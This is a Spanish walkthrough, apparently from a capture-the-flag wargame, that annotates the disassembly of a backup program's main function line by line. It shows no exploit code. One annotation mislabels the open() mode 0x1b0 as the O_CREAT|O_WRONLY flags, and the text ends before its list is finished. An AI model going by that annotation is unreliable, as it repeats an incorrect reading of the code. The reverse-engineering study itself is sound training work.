# **ANÁLISIS COMPLETO LINEA POR LINEA - NIVEL level08**

```asm
Dump of assembler code for function main:
   0x00000000004009f0 <+0>:	push   rbp
   0x00000000004009f1 <+1>:	mov    rbp,rsp
   0x00000000004009f4 <+4>:	sub    rsp,0xb0
   0x00000000004009fb <+11>:	mov    DWORD PTR [rbp-0x94],edi
   0x0000000000400a01 <+17>:	mov    QWORD PTR [rbp-0xa0],rsi
   0x0000000000400a08 <+24>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400a11 <+33>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400a15 <+37>:	xor    eax,eax
   0x0000000000400a17 <+39>:	mov    BYTE PTR [rbp-0x71],0xff
   0x0000000000400a1b <+43>:	mov    DWORD PTR [rbp-0x78],0xffffffff
   0x0000000000400a22 <+50>:	cmp    DWORD PTR [rbp-0x94],0x2
   0x0000000000400a29 <+57>:	je     0x400a4a <main+90>
   0x0000000000400a2b <+59>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400a32 <+66>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400a35 <+69>:	mov    eax,0x400d57
   0x0000000000400a3a <+74>:	mov    rsi,rdx
   0x0000000000400a3d <+77>:	mov    rdi,rax
   0x0000000000400a40 <+80>:	mov    eax,0x0
   0x0000000000400a45 <+85>:	call   0x400730 <printf@plt>
   0x0000000000400a4a <+90>:	mov    edx,0x400d6b
   0x0000000000400a4f <+95>:	mov    eax,0x400d6d
   0x0000000000400a54 <+100>:	mov    rsi,rdx
   0x0000000000400a57 <+103>:	mov    rdi,rax
   0x0000000000400a5a <+106>:	call   0x4007c0 <fopen@plt>
   0x0000000000400a5f <+111>:	mov    QWORD PTR [rbp-0x88],rax
   0x0000000000400a66 <+118>:	cmp    QWORD PTR [rbp-0x88],0x0
   0x0000000000400a6e <+126>:	jne    0x400a91 <main+161>
   0x0000000000400a70 <+128>:	mov    eax,0x400d7c
   0x0000000000400a75 <+133>:	mov    esi,0x400d6d
   0x0000000000400a7a <+138>:	mov    rdi,rax
   0x0000000000400a7d <+141>:	mov    eax,0x0
   0x0000000000400a82 <+146>:	call   0x400730 <printf@plt>
   0x0000000000400a87 <+151>:	mov    edi,0x1
   0x0000000000400a8c <+156>:	call   0x4007d0 <exit@plt>
   0x0000000000400a91 <+161>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400a98 <+168>:	add    rax,0x8
   0x0000000000400a9c <+172>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400a9f <+175>:	mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000400aa6 <+182>:	mov    esi,0x400d96
   0x0000000000400aab <+187>:	mov    rdi,rax
   0x0000000000400aae <+190>:	call   0x4008c4 <log_wrapper>
   0x0000000000400ab3 <+195>:	mov    edx,0x400da9
   0x0000000000400ab8 <+200>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400abf <+207>:	add    rax,0x8
   0x0000000000400ac3 <+211>:	mov    rax,QWORD PTR [rax]
   0x0000000000400ac6 <+214>:	mov    rsi,rdx
   0x0000000000400ac9 <+217>:	mov    rdi,rax
   0x0000000000400acc <+220>:	call   0x4007c0 <fopen@plt>
   0x0000000000400ad1 <+225>:	mov    QWORD PTR [rbp-0x80],rax
   0x0000000000400ad5 <+229>:	cmp    QWORD PTR [rbp-0x80],0x0
   0x0000000000400ada <+234>:	jne    0x400b09 <main+281>
   0x0000000000400adc <+236>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400ae3 <+243>:	add    rax,0x8
   0x0000000000400ae7 <+247>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400aea <+250>:	mov    eax,0x400d7c
   0x0000000000400aef <+255>:	mov    rsi,rdx
   0x0000000000400af2 <+258>:	mov    rdi,rax
   0x0000000000400af5 <+261>:	mov    eax,0x0
   0x0000000000400afa <+266>:	call   0x400730 <printf@plt>
   0x0000000000400aff <+271>:	mov    edi,0x1
   0x0000000000400b04 <+276>:	call   0x4007d0 <exit@plt>
   0x0000000000400b09 <+281>:	mov    edx,0x400dab
   0x0000000000400b0e <+286>:	lea    rax,[rbp-0x70]
   0x0000000000400b12 <+290>:	mov    rcx,QWORD PTR [rdx]
   0x0000000000400b15 <+293>:	mov    QWORD PTR [rax],rcx
   0x0000000000400b18 <+296>:	movzx  ecx,WORD PTR [rdx+0x8]
   0x0000000000400b1c <+300>:	mov    WORD PTR [rax+0x8],cx
   0x0000000000400b20 <+304>:	movzx  edx,BYTE PTR [rdx+0xa]
   0x0000000000400b24 <+308>:	mov    BYTE PTR [rax+0xa],dl
   0x0000000000400b27 <+311>:	lea    rax,[rbp-0x70]
   0x0000000000400b2b <+315>:	mov    QWORD PTR [rbp-0xa8],0xffffffffffffffff
   0x0000000000400b36 <+326>:	mov    rdx,rax
   0x0000000000400b39 <+329>:	mov    eax,0x0
   0x0000000000400b3e <+334>:	mov    rcx,QWORD PTR [rbp-0xa8]
   0x0000000000400b45 <+341>:	mov    rdi,rdx
   0x0000000000400b48 <+344>:	repnz scas al,BYTE PTR es:[rdi]
   0x0000000000400b4a <+346>:	mov    rax,rcx
   0x0000000000400b4d <+349>:	not    rax
   0x0000000000400b50 <+352>:	lea    rdx,[rax-0x1]
   0x0000000000400b54 <+356>:	mov    eax,0x63
   0x0000000000400b59 <+361>:	mov    rcx,rax
   0x0000000000400b5c <+364>:	sub    rcx,rdx
   0x0000000000400b5f <+367>:	mov    rdx,rcx
   0x0000000000400b62 <+370>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400b69 <+377>:	add    rax,0x8
   0x0000000000400b6d <+381>:	mov    rax,QWORD PTR [rax]
   0x0000000000400b70 <+384>:	mov    rcx,rax
   0x0000000000400b73 <+387>:	lea    rax,[rbp-0x70]
   0x0000000000400b77 <+391>:	mov    rsi,rcx
   0x0000000000400b7a <+394>:	mov    rdi,rax
   0x0000000000400b7d <+397>:	call   0x400750 <strncat@plt>
   0x0000000000400b82 <+402>:	lea    rax,[rbp-0x70]
   0x0000000000400b86 <+406>:	mov    edx,0x1b0
   0x0000000000400b8b <+411>:	mov    esi,0xc1
   0x0000000000400b90 <+416>:	mov    rdi,rax
   0x0000000000400b93 <+419>:	mov    eax,0x0
   0x0000000000400b98 <+424>:	call   0x4007b0 <open@plt>
   0x0000000000400b9d <+429>:	mov    DWORD PTR [rbp-0x78],eax
   0x0000000000400ba0 <+432>:	cmp    DWORD PTR [rbp-0x78],0x0
   0x0000000000400ba4 <+436>:	jns    0x400bed <main+509>
   0x0000000000400ba6 <+438>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400bad <+445>:	add    rax,0x8
   0x0000000000400bb1 <+449>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400bb4 <+452>:	mov    eax,0x400db6
   0x0000000000400bb9 <+457>:	mov    esi,0x400dab
   0x0000000000400bbe <+462>:	mov    rdi,rax
   0x0000000000400bc1 <+465>:	mov    eax,0x0
   0x0000000000400bc6 <+470>:	call   0x400730 <printf@plt>
   0x0000000000400bcb <+475>:	mov    edi,0x1
   0x0000000000400bd0 <+480>:	call   0x4007d0 <exit@plt>
   0x0000000000400bd5 <+485>:	lea    rcx,[rbp-0x71]
   0x0000000000400bd9 <+489>:	mov    eax,DWORD PTR [rbp-0x78]
   0x0000000000400bdc <+492>:	mov    edx,0x1
   0x0000000000400be1 <+497>:	mov    rsi,rcx
   0x0000000000400be4 <+500>:	mov    edi,eax
   0x0000000000400be6 <+502>:	call   0x400700 <write@plt>
   0x0000000000400beb <+507>:	jmp    0x400bee <main+510>
   0x0000000000400bed <+509>:	nop
   0x0000000000400bee <+510>:	mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000400bf2 <+514>:	mov    rdi,rax
   0x0000000000400bf5 <+517>:	call   0x400760 <fgetc@plt>
   0x0000000000400bfa <+522>:	mov    BYTE PTR [rbp-0x71],al
   0x0000000000400bfd <+525>:	movzx  eax,BYTE PTR [rbp-0x71]
   0x0000000000400c01 <+529>:	cmp    al,0xff
   0x0000000000400c03 <+531>:	jne    0x400bd5 <main+485>
   0x0000000000400c05 <+533>:	mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000400c0c <+540>:	add    rax,0x8
   0x0000000000400c10 <+544>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400c13 <+547>:	mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000400c1a <+554>:	mov    esi,0x400dd2
   0x0000000000400c1f <+559>:	mov    rdi,rax
   0x0000000000400c22 <+562>:	call   0x4008c4 <log_wrapper>
   0x0000000000400c27 <+567>:	mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000400c2b <+571>:	mov    rdi,rax
   0x0000000000400c2e <+574>:	call   0x400710 <fclose@plt>
   0x0000000000400c33 <+579>:	mov    eax,DWORD PTR [rbp-0x78]
   0x0000000000400c36 <+582>:	mov    edi,eax
   0x0000000000400c38 <+584>:	call   0x400770 <close@plt>
   0x0000000000400c3d <+589>:	mov    eax,0x0
   0x0000000000400c42 <+594>:	mov    rdi,QWORD PTR [rbp-0x8]
   0x0000000000400c46 <+598>:	xor    rdi,QWORD PTR fs:0x28
   0x0000000000400c4f <+607>:	je     0x400c56 <main+614>
   0x0000000000400c51 <+609>:	call   0x400720 <__stack_chk_fail@plt>
   0x0000000000400c56 <+614>:	leave  
   0x0000000000400c57 <+615>:	ret    
End of assembler dump.
```

### **Líneas 0, 1, 4, 11, 17, 24, 33, 37, 39, 43, 50 y 57:**
```asm
0x00000000004009f0 <+0>:	push   rbp
0x00000000004009f1 <+1>:	mov    rbp,rsp
0x00000000004009f4 <+4>:	sub    rsp,0xb0
0x00000000004009fb <+11>:	mov    DWORD PTR [rbp-0x94],edi
0x0000000000400a01 <+17>:	mov    QWORD PTR [rbp-0xa0],rsi
0x0000000000400a08 <+24>:	mov    rax,QWORD PTR fs:0x28
0x0000000000400a11 <+33>:	mov    QWORD PTR [rbp-0x8],rax
0x0000000000400a15 <+37>:	xor    eax,eax
0x0000000000400a17 <+39>:	mov    BYTE PTR [rbp-0x71],0xff
0x0000000000400a1b <+43>:	mov    DWORD PTR [rbp-0x78],0xffffffff
0x0000000000400a22 <+50>:	cmp    DWORD PTR [rbp-0x94],0x2
0x0000000000400a29 <+57>:	je     0x400a4a <main+90>
```

1.  <+0>: Guarda en lo alto del stack el valor de `RBP` (cpu) `[rsp + 0x00]`. El `RSP` se desplaza 8 bytes hacia abajo.
2.  <+1>: Asigna el nuevo `RSP` a `RBP` para la función `main`.
3.  <+4>: Reserva (desplaza) `176 bytes` (0xb0) en el stack de `main()`.
4.  <+11>: Guarda `argc` en `[rbp-0x94]`.
5.  <+17>: Guarda `argv` en `[rbp-0xa0]`.
6.  <+24>: Carga en `RAX` el valor del **Stack Canary** desde `fs:0x28`.
7.  <+33>: Guarda el **Stack Canary** en `[rbp-0x8]`.
8.  <+37>: Pone `EAX` a 0.
9.  <+39>: Inicializa a `0xff` la variable local `char` en `[rbp-0x71]` — el byte leído del archivo.
10. <+43>: Inicializa a `0xffffffff` la variable local `fd` en `[rbp-0x78]` — el file descriptor del archivo de destino.
11. <+50>: Compara `argc` con `2` — verifica que se pasó exactamente un argumento.
12. <+57>: `je` — si `argc == 2` salta a `<+90>` y continúa. Si no imprime el mensaje de uso.

### **Líneas 59, 66, 69, 74, 77, 80 y 85:**
```asm
0x0000000000400a2b <+59>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400a32 <+66>:	mov    rdx,QWORD PTR [rax]
0x0000000000400a35 <+69>:	mov    eax,0x400d57
0x0000000000400a3a <+74>:	mov    rsi,rdx
0x0000000000400a3d <+77>:	mov    rdi,rax
0x0000000000400a40 <+80>:	mov    eax,0x0
0x0000000000400a45 <+85>:	call   0x400730 <printf@plt>
```

1.  <+59>: Carga en `RAX` el puntero `argv`.
2.  <+66>: Desreferencia — carga `argv[0]` (nombre del programa) en `RDX`.
3.  <+69>: Carga en `EAX` la dirección del formato `"Usage: %s filename\n"` en `0x400d57`.
```bash
(gdb) x/s 0x400d57
0x400d57:	 "Usage: %s filename\n"
```
4.  <+74>: Copia `argv[0]` en `RSI` — segundo argumento de `printf()`.
5.  <+77>: Copia el formato en `RDI` — primer argumento de `printf()`.
6.  <+80>: Pone `EAX` a 0 — convención x86-64 para `printf()`.
7.  <+85>: Llama a `printf("Usage: %s filename\n", argv[0])`.

### **Líneas 90, 95, 100, 103, 106, 111, 118, 126, 128, 133, 138, 141, 146, 151 y 156:**
```asm
0x0000000000400a4a <+90>:	mov    edx,0x400d6b
0x0000000000400a4f <+95>:	mov    eax,0x400d6d
0x0000000000400a54 <+100>:	mov    rsi,rdx
0x0000000000400a57 <+103>:	mov    rdi,rax
0x0000000000400a5a <+106>:	call   0x4007c0 <fopen@plt>
0x0000000000400a5f <+111>:	mov    QWORD PTR [rbp-0x88],rax
0x0000000000400a66 <+118>:	cmp    QWORD PTR [rbp-0x88],0x0
0x0000000000400a6e <+126>:	jne    0x400a91 <main+161>
0x0000000000400a70 <+128>:	mov    eax,0x400d7c
0x0000000000400a75 <+133>:	mov    esi,0x400d6d
0x0000000000400a7a <+138>:	mov    rdi,rax
0x0000000000400a7d <+141>:	mov    eax,0x0
0x0000000000400a82 <+146>:	call   0x400730 <printf@plt>
0x0000000000400a87 <+151>:	mov    edi,0x1
0x0000000000400a8c <+156>:	call   0x4007d0 <exit@plt>
```

1.  <+90>: Carga en `EDX` la dirección del modo `"w"` en `0x400d6b`.
```bash
(gdb) x/s 0x400d6b
0x400d6b:	 "w"
```
2.  <+95>: Carga en `EAX` la dirección de la ruta `"./backups/.log"` en `0x400d6d`.
```bash
(gdb) x/s 0x400d6d
0x400d6d:	 "./backups/.log"
```
3.  <+100>: Copia el modo `"w"` en `RSI` — segundo argumento de `fopen()`.
4.  <+103>: Copia la ruta en `RDI` — primer argumento de `fopen()`.
5.  <+106>: Llama a `fopen("./backups/.log", "w")` — abre el archivo de log.
6.  <+111>: Guarda el puntero `FILE*` devuelto en `[rbp-0x88]` — variable `log_fp`.
7.  <+118>: Compara `log_fp` con 0.
8.  <+126>: `jne` — si `log_fp != NULL` continúa a `<+161>`.
9.  <+128>: Carga el formato `"ERROR: Failed to open %s\n"` en `EAX`.
```bash
(gdb) x/s 0x400d7c
0x400d7c:	 "ERROR: Failed to open %s\n"
```
10. <+133>: Carga `"./backups/.log"` en `ESI` — segundo argumento de `printf()`.
```bash
(gdb) x/s 0x400d6d
0x400d6d:	 "./backups/.log"
```
11. <+138>: Copia el formato en `RDI`.
12. <+141>: Pone `EAX` a 0.
13. <+146>: Llama a `printf("ERROR: Failed to open %s\n", "./backups/.log")`.
14. <+151>: Carga `1` en `EDI` — código de salida.
15. <+156>: Llama a `exit(1)`.

### **Líneas 161, 168, 172, 175, 182, 187, 190, 195, 200, 207, 211, 214, 217, 220, 225, 229, 234, 236, 243, 247, 250, 255, 258, 261, 266, 271 y 276:**
```asm
0x0000000000400a91 <+161>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400a98 <+168>:	add    rax,0x8
0x0000000000400a9c <+172>:	mov    rdx,QWORD PTR [rax]
0x0000000000400a9f <+175>:	mov    rax,QWORD PTR [rbp-0x88]
0x0000000000400aa6 <+182>:	mov    esi,0x400d96
0x0000000000400aab <+187>:	mov    rdi,rax
0x0000000000400aae <+190>:	call   0x4008c4 <log_wrapper>
0x0000000000400ab3 <+195>:	mov    edx,0x400da9
0x0000000000400ab8 <+200>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400abf <+207>:	add    rax,0x8
0x0000000000400ac3 <+211>:	mov    rax,QWORD PTR [rax]
0x0000000000400ac6 <+214>:	mov    rsi,rdx
0x0000000000400ac9 <+217>:	mov    rdi,rax
0x0000000000400acc <+220>:	call   0x4007c0 <fopen@plt>
0x0000000000400ad1 <+225>:	mov    QWORD PTR [rbp-0x80],rax
0x0000000000400ad5 <+229>:	cmp    QWORD PTR [rbp-0x80],0x0
0x0000000000400ada <+234>:	jne    0x400b09 <main+281>
0x0000000000400adc <+236>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400ae3 <+243>:	add    rax,0x8
0x0000000000400ae7 <+247>:	mov    rdx,QWORD PTR [rax]
0x0000000000400aea <+250>:	mov    eax,0x400d7c
0x0000000000400aef <+255>:	mov    rsi,rdx
0x0000000000400af2 <+258>:	mov    rdi,rax
0x0000000000400af5 <+261>:	mov    eax,0x0
0x0000000000400afa <+266>:	call   0x400730 <printf@plt>
0x0000000000400aff <+271>:	mov    edi,0x1
0x0000000000400b04 <+276>:	call   0x4007d0 <exit@plt>
```

1.  <+161>: Carga `argv` en `RAX`.
2.  <+168>: Suma `8` a `RAX` — avanza al segundo puntero (`argv[1]`).
3.  <+172>: Carga `argv[1]` (el filename) en `RDX`.
4.  <+175>: Carga `log_fp` en `RAX`.
5.  <+182>: Carga en `ESI` la dirección del string `"Starting back up: "` en `0x400d96`.
```bash
(gdb) x/s 0x400d96
0x400d96:	 "Starting back up: "
```
6.  <+187>: Copia `log_fp` en `RDI` — primer argumento de `log_wrapper()`.
7.  <+190>: Llama a `log_wrapper(log_fp, argv[1], "Starting back up: ")`.
8.  <+195>: Carga en `EDX` el modo `"r"` en `0x400da9`.
```bash
(gdb) x/s 0x400da9
0x400da9:	 "r"
```
9.  <+200>: Carga `argv` en `RAX`.
10. <+207>: Suma `8` — apunta a `argv[1]`.
11. <+211>: Carga `argv[1]` en `RAX`.
12. <+214>: Copia `"r"` en `RSI` — segundo argumento de `fopen()`.
13. <+217>: Copia `argv[1]` en `RDI` — primer argumento de `fopen()`.
14. <+220>: Llama a `fopen(argv[1], "r")` — abre el archivo de input.
15. <+225>: Guarda el puntero `FILE*` en `[rbp-0x80]` — variable `src_fp`.
16. <+229>: Compara `src_fp` con 0.
17. <+234>: `jne` — si `src_fp != NULL` continúa a `<+281>`.
18. <+236>: Carga `argv` en `RAX`.
19. <+243>: Suma `8` — apunta a `argv[1]`.
20. <+247>: Carga `argv[1]` en `RDX`.
21. <+250>: Carga el formato `"ERROR: Failed to open %s\n"` en `EAX`.
```bash
(gdb) x/s 0x400d7c
0x400d7c:	 "ERROR: Failed to open %s\n"
```
22. <+255>: Copia `argv[1]` en `RSI`.
23. <+258>: Copia el formato en `RDI`.
24. <+261>: Pone `EAX` a 0.
25. <+266>: Llama a `printf("ERROR: Failed to open %s\n", argv[1])`.
26. <+271>: Carga `1` en `EDI`.
27. <+276>: Llama a `exit(1)`.

### **Líneas 281, 286, 290, 293, 296, 300, 304, 308, 311, 315, 326, 329, 334, 341, 344, 346, 349, 352, 356, 361, 364, 367, 370, 377, 381, 384, 387, 391, 394 y 397:**
```asm
0x0000000000400b09 <+281>:	mov    edx,0x400dab
0x0000000000400b0e <+286>:	lea    rax,[rbp-0x70]
0x0000000000400b12 <+290>:	mov    rcx,QWORD PTR [rdx]
0x0000000000400b15 <+293>:	mov    QWORD PTR [rax],rcx
0x0000000000400b18 <+296>:	movzx  ecx,WORD PTR [rdx+0x8]
0x0000000000400b1c <+300>:	mov    WORD PTR [rax+0x8],cx
0x0000000000400b20 <+304>:	movzx  edx,BYTE PTR [rdx+0xa]
0x0000000000400b24 <+308>:	mov    BYTE PTR [rax+0xa],dl
0x0000000000400b27 <+311>:	lea    rax,[rbp-0x70]
0x0000000000400b2b <+315>:	mov    QWORD PTR [rbp-0xa8],0xffffffffffffffff
0x0000000000400b36 <+326>:	mov    rdx,rax
0x0000000000400b39 <+329>:	mov    eax,0x0
0x0000000000400b3e <+334>:	mov    rcx,QWORD PTR [rbp-0xa8]
0x0000000000400b45 <+341>:	mov    rdi,rdx
0x0000000000400b48 <+344>:	repnz scas al,BYTE PTR es:[rdi]
0x0000000000400b4a <+346>:	mov    rax,rcx
0x0000000000400b4d <+349>:	not    rax
0x0000000000400b50 <+352>:	lea    rdx,[rax-0x1]
0x0000000000400b54 <+356>:	mov    eax,0x63
0x0000000000400b59 <+361>:	mov    rcx,rax
0x0000000000400b5c <+364>:	sub    rcx,rdx
0x0000000000400b5f <+367>:	mov    rdx,rcx
0x0000000000400b62 <+370>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400b69 <+377>:	add    rax,0x8
0x0000000000400b6d <+381>:	mov    rax,QWORD PTR [rax]
0x0000000000400b70 <+384>:	mov    rcx,rax
0x0000000000400b73 <+387>:	lea    rax,[rbp-0x70]
0x0000000000400b77 <+391>:	mov    rsi,rcx
0x0000000000400b7a <+394>:	mov    rdi,rax
0x0000000000400b7d <+397>:	call   0x400750 <strncat@plt>
```

1.  <+281>: Carga en `EDX` la dirección del string `"./backups/"` en `0x400dab`.
```bash
(gdb) x/s 0x400dab
0x400dab:	 "./backups/"
```
2.  <+286>: Calcula la dirección de `[rbp-0x70]` que es la variable local `dst_path` y la carga en `RAX`.
3.  <+290>: Copia los primeros 8 bytes de `"./backups/"` en `dst_path`.
4.  <+293>: Escribe esos bytes en `dst_path`.
5.  <+296>: Copia los bytes `8-9` de `"./backups/"`.
6.  <+300>: Los escribe en `dst_path+8`.
7.  <+304>: Copia el byte `10` de `"./backups/"`.
8.  <+308>: Lo escribe en `dst_path+10` — `dst_path` queda inicializado con `"./backups/"`.
9.  <+311>: Calcula de nuevo la dirección de `dst_path` en `RAX`.
10. <+315>: Inicializa el contador de `repnz scas` a `0xffffffffffffffff`.
11. <+326>: Copia `dst_path` en `RDX`.
12. <+329>: Pone `RAX` a 0 — byte que buscará `repnz scas`.
13. <+334>: Carga el contador en `RCX`.
14. <+341>: Copia `dst_path` en `RDI`.
15. <+344>: `repnz scas` — calcula `strlen(dst_path)` = 10.
16. <+346>: Copia el resultado en `RAX`.
17. <+349>: Aplica `NOT RAX`.
18. <+352>: `lea rdx, [rax-1]` — obtiene la longitud real de `dst_path`.
19. <+356>: Carga `99` (0x63) en `EAX` — tamaño máximo del buffer.
20. <+361>: Copia `99` en `RCX`.
21. <+364>: `sub rcx, rdx` — calcula `99 - strlen(dst_path)` = número de bytes disponibles.
22. <+367>: Copia el resultado en `RDX` — tercer argumento de `strncat()`.
23. <+370>: Carga `argv` en `RAX`.
24. <+377>: Suma `8` — apunta a `argv[1]`.
25. <+381>: Carga `argv[1]` en `RAX`.
26. <+384>: Copia `argv[1]` en `RCX`.
27. <+387>: Calcula la dirección de `dst_path` en `RAX`.
28. <+391>: Copia `argv[1]` en `RSI` — segundo argumento de `strncat()`.
29. <+394>: Copia `dst_path` en `RDI` — primer argumento de `strncat()`.
30. <+397>: Llama a `strncat(dst_path, argv[1], 99 - strlen(dst_path))` — concatena el filename a `"./backups/"`.

### **Líneas 402, 406, 411, 416, 419, 424, 429, 432, 436, 438, 445, 449, 452, 457, 462, 465, 470, 475 y 480:**
```asm
0x0000000000400b82 <+402>:	lea    rax,[rbp-0x70]
0x0000000000400b86 <+406>:	mov    edx,0x1b0
0x0000000000400b8b <+411>:	mov    esi,0xc1
0x0000000000400b90 <+416>:	mov    rdi,rax
0x0000000000400b93 <+419>:	mov    eax,0x0
0x0000000000400b98 <+424>:	call   0x4007b0 <open@plt>
0x0000000000400b9d <+429>:	mov    DWORD PTR [rbp-0x78],eax
0x0000000000400ba0 <+432>:	cmp    DWORD PTR [rbp-0x78],0x0
0x0000000000400ba4 <+436>:	jns    0x400bed <main+509>
0x0000000000400ba6 <+438>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400bad <+445>:	add    rax,0x8
0x0000000000400bb1 <+449>:	mov    rdx,QWORD PTR [rax]
0x0000000000400bb4 <+452>:	mov    eax,0x400db6
0x0000000000400bb9 <+457>:	mov    esi,0x400dab
0x0000000000400bbe <+462>:	mov    rdi,rax
0x0000000000400bc1 <+465>:	mov    eax,0x0
0x0000000000400bc6 <+470>:	call   0x400730 <printf@plt>
0x0000000000400bcb <+475>:	mov    edi,0x1
0x0000000000400bd0 <+480>:	call   0x4007d0 <exit@plt>
```

1.  <+402>: Calcula la dirección de `dst_path` en `RAX`.
2.  <+406>: Carga `0x1b0` (432) en `EDX` — permisos del archivo: `O_CREAT|O_WRONLY`.
3.  <+411>: Carga `0xc1` (193) en `ESI` — flags de `open()`.
4.  <+416>: Copia `dst_path` en `RDI` — primer argumento de `open()`.
5.  <+419>: Pone `EAX` a 0.
6.  <+424>: Llama a `open(dst_path, 0xc1, 0x1b0)` — abre el archivo de destino en modo escritura/creación.
7.  <+429>: Guarda el file descriptor en `fd` `[rbp-0x78]`.
8.  <+432>: Compara `fd` con 0.
9.  <+436>: `jns` — si `fd >= 0` (sin error) salta a `<+509>`.
10. <+438>: Carga `argv` en `RAX`.
11. <+445>: Suma `8` — apunta a `argv[1]`.
12. <+449>: Carga `argv[1]` en `RDX`.
13. <+452>: Carga el formato `"ERROR: Failed to open %s%s\n"` en `EAX`.
```bash
(gdb) x/s 0x400db6
0x400db6:	 "ERROR: Failed to open %s%s\n"
```
14. <+457>: Carga `"./backups/"` en `ESI`.
```bash
(gdb) x/s 0x400dab
0x400dab:	 "./backups/"
```
15. <+462>: Copia el formato en `RDI`.
16. <+465>: Pone `EAX` a 0.
17. <+470>: Llama a `printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1])`.
18. <+475>: Carga `1` en `EDI`.
19. <+480>: Llama a `exit(1)`.

### **Líneas 485, 489, 492, 497, 500, 502, 507, 509, 510, 514, 517, 522, 525, 529, 531:**
```asm
0x0000000000400bd5 <+485>:	lea    rcx,[rbp-0x71]
0x0000000000400bd9 <+489>:	mov    eax,DWORD PTR [rbp-0x78]
0x0000000000400bdc <+492>:	mov    edx,0x1
0x0000000000400be1 <+497>:	mov    rsi,rcx
0x0000000000400be4 <+500>:	mov    edi,eax
0x0000000000400be6 <+502>:	call   0x400700 <write@plt>
0x0000000000400beb <+507>:	jmp    0x400bee <main+510>
0x0000000000400bed <+509>:	nop
0x0000000000400bee <+510>:	mov    rax,QWORD PTR [rbp-0x80]
0x0000000000400bf2 <+514>:	mov    rdi,rax
0x0000000000400bf5 <+517>:	call   0x400760 <fgetc@plt>
0x0000000000400bfa <+522>:	mov    BYTE PTR [rbp-0x71],al
0x0000000000400bfd <+525>:	movzx  eax,BYTE PTR [rbp-0x71]
0x0000000000400c01 <+529>:	cmp    al,0xff
0x0000000000400c03 <+531>:	jne    0x400bd5 <main+485>
```

1.  <+485>: Calcula la dirección de `char` en `[rbp-0x71]` y la carga en `RCX`.
2.  <+489>: Carga `fd` en `EAX`.
3.  <+492>: Carga `1` en `EDX` — número de bytes a escribir.
4.  <+497>: Copia la dirección de `char` en `RSI` — segundo argumento de `write()`.
5.  <+500>: Copia `fd` en `EDI` — primer argumento de `write()`.
6.  <+502>: Llama a `write(fd, &char, 1)` — escribe un byte en el archivo de destino.
7.  <+507>: `jmp` incondicional a `<+510>`.
8.  <+509>: `nop` — artefacto del compilador.
9.  <+510>: Carga `src_fp` en `RAX`.
10. <+514>: Copia `src_fp` en `RDI` — argumento de `fgetc()`.
11. <+517>: Llama a `fgetc(src_fp)` — lee un byte del archivo de input.
12. <+522>: Guarda el byte leído en `char` `[rbp-0x71]`.
13. <+525>: Carga `char` en `EAX` con extensión de cero.
14. <+529>: Compara `char` con `0xff` — comprueba si es `EOF`.
15. <+531>: `jne` — si no es `EOF` vuelve a `<+485>` para escribir el byte y leer el siguiente.

### **Líneas 533, 540, 544, 547, 554, 559, 562, 567, 571, 574, 579, 582, 584, 589, 594, 598, 607, 609, 614 y 615:**
```asm
0x0000000000400c05 <+533>:	mov    rax,QWORD PTR [rbp-0xa0]
0x0000000000400c0c <+540>:	add    rax,0x8
0x0000000000400c10 <+544>:	mov    rdx,QWORD PTR [rax]
0x0000000000400c13 <+547>:	mov    rax,QWORD PTR [rbp-0x88]
0x0000000000400c1a <+554>:	mov    esi,0x400dd2
0x0000000000400c1f <+559>:	mov    rdi,rax
0x0000000000400c22 <+562>:	call   0x4008c4 <log_wrapper>
0x0000000000400c27 <+567>:	mov    rax,QWORD PTR [rbp-0x80]
0x0000000000400c2b <+571>:	mov    rdi,rax
0x0000000000400c2e <+574>:	call   0x400710 <fclose@plt>
0x0000000000400c33 <+579>:	mov    eax,DWORD PTR [rbp-0x78]
0x0000000000400c36 <+582>:	mov    edi,eax
0x0000000000400c38 <+584>:	call   0x400770 <close@plt>
0x0000000000400c3d <+589>:	mov    eax,0x0
0x0000000000400c42 <+594>:	mov    rdi,QWORD PTR [rbp-0x8]
0x0000000000400c46 <+598>:	xor    rdi,QWORD PTR fs:0x28
0x0000000000400c4f <+607>:	je     0x400c56 <main+614>
0x0000000000400c51 <+609>:	call   0x400720 <__stack_chk_fail@plt>
0x0000000000400c56 <+614>:	leave  
0x0000000000400c57 <+615>:	ret
```

1.  <+533>: Carga `argv` en `RAX`.
2.  <+540>: Suma `8` — apunta a `argv[1]`.
3.  <+544>: Carga `argv[1]` en `RDX`.
4.  <+547>: Carga `log_fp` en `RAX`.
5.  <+554>: Carga en `ESI` la dirección del string `"Finished back up "` en `0x400dd2`.
6.  <+559>: Copia `log_fp` en `RDI`.
7.  <+562>: Llama a `log_wrapper(log_fp, argv[1], "Finished back up ")`.
8.  <+567>: Carga `src_fp` en `RAX`.
9.  <+571>: Copia `src_fp` en `RDI`.
10. <+574>: Llama a `fclose(src_fp)`.
11. <+579>: Carga `fd` en `EAX`.
12. <+582>: Copia `fd` en `EDI`.
13. <+584>: Llama a `close(fd)`.
14. <+589>: Pone `EAX` a 0 — valor de retorno de `main()`.
15. <+594>: Carga el **Stack Canary** guardado en `[rbp-0x8]` en `RDI`.
16. <+598>: Aplica `XOR` con el canary original de `fs:0x28`.
17. <+607>: `je` — si coinciden termina normalmente.
